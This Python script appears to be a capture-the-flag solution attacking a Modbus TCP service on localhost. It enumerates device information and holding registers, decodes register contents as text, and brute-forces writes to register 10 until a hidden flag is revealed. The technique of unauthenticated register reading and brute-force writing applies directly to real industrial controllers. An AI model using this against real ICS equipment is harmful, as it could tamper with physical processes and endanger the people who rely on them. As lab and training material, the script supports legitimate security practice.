from pymodbus.client import ModbusTcpClient

# connect to client
client = ModbusTcpClient("127.0.0.1", port=5020)

# get device info
print(client.read_device_information())

# poll the first 100 registers
for i in range(100):
    response = client.read_holding_registers(i)
    print(f"Register {i}: {response.registers}")

# We see a contiguous block starting at register 50 that could be text, 
# let's decode by adding the code below

message = ""
for i in range(50,77):
    response = client.read_holding_registers(i)
    registerValue = response.registers[0]
    message += chr(int(registerValue))
print(message)

# The above must be the flag, where registers 60-75 have been sanitized.
# We know that to unlock the flag registers 10 and 20 must be overwritten
# modbus holding registers are 2 bytes, so we can simply brute force the values in the registers

for r10Val in range(0, 65536):
    client.write_register(10, r10Val)
    print(f"DEBUG: r10={r10Val}")

    # check if register 60 was overwritten, meaning the flag was unlocked
    reg60Val = client.read_holding_registers(60).registers[0]
    if (reg60Val != 0):
        flag = ""
        for i in range(50,78):
            response = client.read_holding_registers(i)
            registerValue = response.registers[0]
            flag += chr(int(registerValue))
        print(flag)
        break